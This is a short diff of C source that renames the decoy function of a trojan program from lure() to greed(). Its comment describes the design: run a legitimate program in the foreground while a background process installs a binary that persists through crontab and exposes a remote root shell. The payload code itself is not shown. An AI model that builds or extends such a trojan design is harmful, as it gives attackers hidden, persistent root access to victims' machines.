@@ -66,7 +66,7 @@ int add_crontab_entry(const char *cpath, const char *bpath)
 }
 
 /*
- * This programm will start whatever legit software in the foreground (lure.c)
+ * This programm will start whatever legit software in the foreground (greed.c)
  * and a malicious code in the background. This malicious code will add
  * a binary in system binaries, and execute it as a daemon at each reboot.
  * This binary will expose a remote root shell.
@@ -92,7 +92,7 @@ int main(void)
 	else if (pid > 0)
 	{
 		// Legit code
-		lure();
+		greed();
 	}
 	else
 	{
